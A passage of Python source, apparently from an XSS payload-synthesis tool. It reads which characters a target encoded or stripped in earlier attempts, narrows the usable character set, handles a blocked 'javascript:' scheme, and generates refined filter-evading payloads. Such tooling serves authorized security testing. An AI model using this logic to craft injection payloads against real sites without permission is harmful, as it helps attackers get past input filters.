            if any(v and v in snippet for v in variants):
                encoded.add(c)
            else:
                stripped.add(c)
        return encoded, stripped

    failed = [
        o for o in observations
        if (o.get("status") in ("encoded", "stripped"))
        or o.get("stripped") or o.get("encoded")
    ]
    if not failed:
        return []

    refined = Scenario(
        context=scenario.context,
        sink_kind=scenario.sink_kind,
        attribute=scenario.attribute,
        tag=scenario.tag,
        quote_type=scenario.quote_type,
        source_type=scenario.source_type,
        raw_chars=list(scenario.raw_chars),
        encoded_chars=list(scenario.encoded_chars),
        stripped_chars=list(scenario.stripped_chars),
        technologies=list(scenario.technologies),
        is_angular=scenario.is_angular,
    )

    for o in failed:
        payload = str(o.get("payload") or "")
        status = str(o.get("status") or "")
        # Prefer the exact diff against the reflected snippet; fall back to the
        # conservative payload-marker heuristic when no snippet was captured.
        diff = _classify_against_snippet(payload, str(o.get("reflection_snippet") or ""))
        if diff is not None:
            enc, strp = diff
        elif status == "stripped" or o.get("stripped"):
            enc, strp = set(), _markers(payload)
        else:
            enc, strp = _markers(payload), set()
        refined.encoded_chars = sorted(set(refined.encoded_chars) | enc)
        refined.stripped_chars = sorted(set(refined.stripped_chars) | strp)

    # Learned-bad characters must also leave the raw set: _has trusts raw_chars
    # as the initial observation, so a char both raw and stripped would still
    # be treated as usable.
    learned_bad = set(refined.encoded_chars) | set(refined.stripped_chars)
    refined.raw_chars = [c for c in refined.raw_chars if c not in learned_bad]

    scheme_blocked = any(
        str(o.get("payload") or "").startswith("javascript:") for o in failed
    )
    if scheme_blocked:
        # The scheme was normalized/blocked: markup and event vectors remain.
        refined.stripped_chars = sorted(set(refined.stripped_chars) | {":"})
        refined.raw_chars = [c for c in refined.raw_chars if c != ":"]

    payloads = synthesize(refined, max_payloads=max_payloads)
    statuses = "/".join(sorted({str(o.get("status") or "?") for o in failed}))
    for item in payloads:
        item.hypothesis = f"[refined] {item.hypothesis}"
        item.rationale = (
            f"failure analysis: earlier candidates were {statuses}; "
            f"constraint set narrowed to raw={refined.raw_chars} "
            f"encoded={refined.encoded_chars} stripped={refined.stripped_chars}; "
            + item.rationale
        )
    return payloads


__all__ = [
    "Scenario", "SynthesizedPayload", "synthesize", "synthesize_from_constraints",
    "refine_from_observations", "scenario_from_evidence", "plan_for_context",
    "payloads_for_sink_kind", "dom_sink_payloads",
]
